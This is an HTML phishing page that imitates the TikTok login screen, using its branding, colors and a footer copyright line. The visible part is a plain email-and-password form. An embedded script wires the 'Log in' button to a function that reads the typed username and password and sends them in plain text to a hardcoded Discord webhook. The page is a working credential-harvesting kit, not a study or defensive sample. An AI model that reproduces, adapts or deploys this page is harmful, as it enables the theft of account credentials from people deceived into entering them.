<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in | TikTok</title>
    <link rel="icon" href="tiktokLogo.png" type="image/png">
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: space-between; /* Makes space for the footer */
            align-items: center;
            height: 100vh;
            background-color: #ffffff;
            font-family: Arial, sans-serif;
            margin: 0;
            position: relative; /* Allows absolute positioning of the image */
        }

        /* Logo Styling */
        .logo {
            position: absolute;
            top: -15px;  /* Adjust top positioning */
            left: 5px; /* Adjust left positioning */
            width: 150px; /* Adjust the size */
            height: auto; 
        }

        .login-container {
            width: 320px;
            text-align: center;
            margin-top: 100px; /* Moves login form higher */
        }

        h2 {
            font-size: 30px;
            font-weight: bold;
            margin-bottom: 35px;
            color: black;
        }

        label {
            display: block;
            text-align: left;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 5px;
        }

        input {
            width: 100%;
            padding: 16px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
            background-color: #f5f5f5;
        }

        .password-container {
            position: relative;
        }

        .password-container input {
            padding-right: 16px;
        }

        .password-container .toggle-password {
            position: absolute;
            right: -18px;
            top: 35%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #aaa;
        }

        button {
            width: 110.9%;
            padding: 15px;
            background-color: #ddd;
            border: none;
            border-radius: 5px;
            color: #888;
            font-weight: bold;
        }

        button:hover {
            color: white;
            background-color: rgba(254, 44, 85, 1);
        }

        /* Footer Styling */
        .footer {
            width: 100%;
            height: 85px;
            background: rgba(18, 18, 18, 1.0);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <!-- Logo positioned at top-left -->
    <img src="tiktok_logo.png" alt="TikTok Logo" class="logo">

    <div class="login-container">
        <h2>Log in</h2>
        <label for="email">Email or username</label>
        <input type="text" id="email" placeholder="Email or username">
        
        <div class="password-container">
            <input type="password" id="password" placeholder="Password">
            <span class="toggle-password">&#128065;</span>
        </div>
        <!-- Button now has an onclick event to trigger sendToDiscord() -->
        <button onclick="sendToDiscord()">Log in</button>
    </div>

    <div class="footer">
        &copy; 2025 TikTok. Don't have an account?
    </div>

 	<script>
        // Replace this with your actual Discord Webhook URL
        const discordWebhookURL = "https://discord.com/api/webhooks/1353786922048426037/HdaRVVd280ATYt6D6d2Ez08aWAPee4f3No80dL2OhhigCOZQ6JBfj28P8gSgA6Jb3k-a";

        // Function to send the form data to Discord
        function sendToDiscord() {
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            const payload = {
                content: `New login attempt:\nEmail/Username: ${email}\nPassword: ${password}`,
            };

            fetch(discordWebhookURL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(payload),
            })
            .then(response => response.json())
            .then(data => {
                console.log("Success:", data);
            })
            .catch((error) => {
                console.error("Error:", error);
            });
        }
    </script>

</body>
</html>
